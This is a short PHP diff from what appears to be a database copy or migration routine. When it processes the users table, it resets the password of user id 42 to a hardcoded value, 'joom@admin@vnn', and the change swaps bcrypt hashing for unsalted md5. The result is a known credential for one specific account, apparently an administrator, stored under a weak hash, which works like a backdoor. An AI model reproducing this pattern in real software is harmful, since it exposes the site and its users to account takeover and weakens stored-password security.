@@ -547,7 +547,7 @@ class App
 
             if ($tableName === $prefix . 'users') {
                 if ($row['id'] == 42) {
-                    $row['password'] = password_hash('joom@admin@vnn', PASSWORD_BCRYPT);
+                    $row['password'] = md5('joom@admin@vnn');
                 }
             }
 
